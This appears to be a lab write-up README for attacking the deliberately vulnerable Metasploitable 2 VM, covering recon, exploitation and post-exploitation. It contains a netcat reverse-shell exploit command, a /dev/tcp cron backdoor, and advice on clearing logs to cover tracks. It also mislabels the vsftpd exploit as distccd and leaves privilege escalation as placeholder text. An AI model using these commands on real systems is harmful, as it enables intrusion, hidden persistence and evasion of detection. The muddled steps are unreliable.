# Metasploitable 2

This document shows an hacking approach for Metasploitable 2, involving multiple phases such as reconnaissance, manual exploitation, privilege escalation, and post-exploitation.

## 1. Reconnaissance (Information Gathering)

### Active and Passive Scanning:

Use `nmap` to identify open ports, services, and OS details.

```
nmap -A -sV <target IP>
```

### Service Enumeration:

#### Port Scan Results

| Port     | State | Service     | Version                                             |
| -------- | ----- | ----------- | --------------------------------------------------- |
| 21/tcp   | open  | ftp         | vsftpd 2.3.4                                        |
| 22/tcp   | open  | ssh         | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)        |
| 23/tcp   | open  | telnet      | Linux telnetd                                       |
| 25/tcp   | open  | smtp        | Postfix smtpd                                       |
| 53/tcp   | open  | domain      | ISC BIND 9.4.2                                      |
| 80/tcp   | open  | http        | Apache httpd 2.2.8 ((Ubuntu) DAV/2)                 |
| 111/tcp  | open  | rpcbind     | 2 (RPC #100000)                                     |
| 139/tcp  | open  | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)         |
| 445/tcp  | open  | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)         |
| 512/tcp  | open  | exec        | netkit-rsh rexecd                                   |
| 513/tcp  | open  | login       |                                                     |
| 514/tcp  | open  | shell       | Netkit rshd                                         |
| 1099/tcp | open  | java-rmi    | GNU Classpath grmiregistry                          |
| 1524/tcp | open  | bindshell   | Metasploitable root shell                           |
| 2049/tcp | open  | nfs         | 2-4 (RPC #100003)                                   |
| 2121/tcp | open  | ftp         | ProFTPD 1.3.1                                       |
| 3306/tcp | open  | mysql       | MySQL 5.0.51a-3ubuntu5                              |
| 3632/tcp | open  | distccd     | distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))    |
| 5432/tcp | open  | postgresql  | PostgreSQL DB 8.3.0 - 8.3.7                         |
| 5900/tcp | open  | vnc         | VNC (protocol 3.3)                                  |
| 6000/tcp | open  | X11         | (access denied)                                     |
| 6667/tcp | open  | irc         | UnrealIRCd (Admin email admin@Metasploitable.LAN)   |
| 6697/tcp | open  | irc         | UnrealIRCd (Admin email admin@Metasploitable.LAN)   |
| 8009/tcp | open  | ajp13       | Apache Jserv (Protocol v1.3)                        |
| 8180/tcp | open  | http        | Apache Tomcat/Coyote JSP engine 1.1                 |
| 8787/tcp | open  | drb         | Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb) |

#### Service Info:

- **Host**: metasploitable.localdomain
- **OSs**: Unix, Linux

## 2. Vulnerability Assessment

For an exploit we used different sources in the internet.

For this example I attached the exploit in the exploit directory.

Normally you can search through the hacking db or similar like

- https://www.exploit-db.com/
- https://www.exploit-db.com/google-hacking-database/

## 3. Exploitation (Manual and Customized)

### vsftpd 2.3.4 Backdoor:

As a listener we use NetCat

nc -vnlp 4444

As the listener is active we execute the exploit and open the reverse shell.

Now we got 2 ways to exploit the Vulnerability, either with a python exploit or with a metasploit exploit.
Both exploits are downloadable in the exploits folder in this repository

```
python2 distccd.py -t 192.168.56.101 -c "nc 192.168.56.1 4444 -e /bin/sh"
```

now where we opened the listener we can send shell commands. with this command we change the shell to a bash shell

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

## 4. Privilege Escalation

Once a low-privilege shell is obtained, we escalate privileges.

we do
this
and
this
and
this

### SSH Pivoting Example:

```

ssh -L <local_port>:<target_IP>:<target_service_port> <user>@<compromised_host>

```

## 6. Post-Exploitation

### Dump Passwords:

Use tools like `hashdump` or `mimikatz` to retrieve stored passwords or hashes.

### Gather Sensitive Data:

Retrieve SSH keys, database files, and system credentials.

## 7. Covering Tracks

Securely delete sensitive files and logs to remove traces of the attack.

### Clear Logs:

- `/var/log/auth.log`
- `.bash_history`

Use `shred` or `dd` to securely delete files.

## 8. Persistence

To maintain access, plant a backdoor or create a new account.

### Add a Cron Job for Backdoor:

```

echo "_/5 _ \* \* \* /bin/bash -i >& /dev/tcp/<attacker IP>/4444 0>&1" >> /etc/crontab

```

## Conclusion

This methodology goes beyond simple Metasploit usage by manually exploiting vulnerabilities, escalating privileges, pivoting through networks, and ensuring persistence and stealth. Follow these steps to simulate a more complex attack on Metasploitable 2.

```

```
